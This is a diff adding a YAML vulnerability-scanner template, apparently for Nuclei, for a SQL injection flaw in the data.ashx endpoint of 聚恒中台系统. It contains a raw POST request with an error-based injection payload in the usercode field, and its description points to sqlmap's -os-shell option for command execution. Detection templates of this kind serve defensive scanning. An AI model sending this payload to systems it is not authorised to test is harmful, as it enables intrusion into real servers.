@@ -1,0 +1,32 @@
+id: hengjuzhongtai-data-sql
+
+info:
+  name: 聚恒中台系统 data.ashx 组件SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: "聚恒中台系统 data.ashx 接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现操作系统命令执行（RCE）。该缺陷允许远程攻击者绕过输入验证机制，在目标服务器上执行任意代码。参考验证方式：sqlmap -os-shell\n  \n  技术特征：\n    - 漏洞路径：data.ashx\n    - 利用向量：SQL注入\n    - 影响等级：高危\n  \n  参考来源：\n    - https://github.com/sqlmapproject/sqlmap"
+  tags: 聚恒中台系统
+
+http:
+- raw:
+  - |
+    POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Connection: close
+
+    usercode=1' and 1=(convert(int,@@version))--&&mobile=
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '转换成数据类型 int 时失败'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
